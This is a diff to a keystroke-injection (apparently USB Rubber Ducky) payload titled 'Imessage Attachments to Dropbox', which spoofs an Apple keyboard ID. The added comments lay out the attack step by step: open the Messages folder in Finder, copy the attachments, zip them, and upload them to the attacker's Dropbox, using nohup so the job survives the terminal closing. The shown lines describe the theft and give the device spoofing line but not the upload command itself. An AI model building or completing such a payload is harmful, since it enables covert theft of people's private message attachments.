@@ -3,10 +3,20 @@ REM Replace '<SYSTEM USERNAME HERE>' with the systems actual username
 REM Replace "<YOUR API KEY HERE>' with your actual Dropbox API key 
 
 
+REM Here's the breakdown, we simply navigate to the finder 
+REM use the Shift GUI G to open up the "go to folder" menu.
+REM Then we search for & open the messages folder. 
+REM Now we can tab to the attachments folder copy it and navigate to a new window to paste the folder
+REM Then we zip the folder and send it to the dropbox 
+REM Using the nohup and & to make sure the code is executed 
+REM even when closing out of the terminal.
+
+
 REM Author: Narsty
 REM Title: Imessage Attachments to Dropbox
 REM Version 2.0 MacOs
 REM Category: Execution 
+
 
 ID 05ac:021e Apple:Keyboard
 DELAY 500
